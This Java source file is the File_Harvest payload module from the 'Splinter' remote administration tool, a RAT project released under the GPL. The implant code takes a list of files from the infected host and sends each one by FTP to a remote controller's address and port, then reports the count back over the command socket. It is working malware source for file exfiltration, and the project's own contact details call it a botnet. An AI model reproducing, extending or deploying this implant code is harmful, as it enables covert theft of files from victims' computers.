/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/



package Implant.Payloads;

import Implant.Driver;
import Implant.FTP.FTP_Thread_Sender;
import Implant.FTP.IncrementObject;
import java.io.File;
import java.io.PrintWriter;
import java.util.ArrayList;

public class File_Harvest extends Thread
  implements Runnable
{
  private static final String strMyClassName = "File_Harvest";
  String strFTP_Address = "";
  int PORT = 0;
  PrintWriter sktOut = null;

  ArrayList<File> alFileList = new ArrayList();

  int numFilesSent = 0;
  String specialSendType = "";

  public File_Harvest(ArrayList<File> alFilesToSend, String FTP_address, int prt, PrintWriter socketOut, String specialFileSendingType_null_is_ok)
  {
    try
    {
      this.alFileList = alFilesToSend;
      this.strFTP_Address = FTP_address;
      this.PORT = prt;
      this.sktOut = socketOut;
      this.specialSendType = specialFileSendingType_null_is_ok;
    }
    catch (Exception e)
    {
      Driver.eop("File_Harvest Constructor", "File_Harvest", e, e.getLocalizedMessage(), false);
    }
  }

  public void run()
  {
    if ((this.alFileList == null) || (this.alFileList.size() < 1))
    {
      Driver.sop("EMPTY FILE LISTING PROVIDED.  NO FILES TO SEND TO CONTROLLER!");
    }
    else
    {
      sendFiles(this.alFileList, this.strFTP_Address, this.PORT, this.sktOut, this.specialSendType);

      Driver.sop("... --> Done!\n\nSENDING OF FILEs COMPLETE. " + this.numFilesSent + " file(s) transmitted to requestor");
      this.sktOut.println("SENDING OF FILEs COMPLETE. " + this.numFilesSent + " file(s) transmitted to requestor");
      this.sktOut.flush();
    }
  }

  public boolean sendFiles(ArrayList<File> listToSend, String addrToController, int PORT_to_Controller, PrintWriter sktOut, String sendType)
  {
    try
    {
      File fleToSend = null;

      IncrementObject statusIncrement = null;
      try { statusIncrement = new IncrementObject(100.0D / listToSend.size()); } catch (Exception e) { statusIncrement = null; }

      for (int i = 0; i < listToSend.size(); i++)
      {
        fleToSend = (File)listToSend.get(i);

        if ((fleToSend != null) && (fleToSend.exists()) && (fleToSend.isFile()))
        {
          FTP_Thread_Sender FTP_Sender = new FTP_Thread_Sender(true, false, addrToController, PORT_to_Controller, 4096, fleToSend, sktOut, false, sendType, statusIncrement);
          FTP_Sender.start();
          try {
            this.numFilesSent += 1;
          } catch (Exception localException1) {
          }
        }
      }
      return true;
    }
    catch (Exception e)
    {
      Driver.eop("sendFiles", "File_Harvest", e, "Perhaps empty arraylist provided...", false);
    }

    return false;
  }
}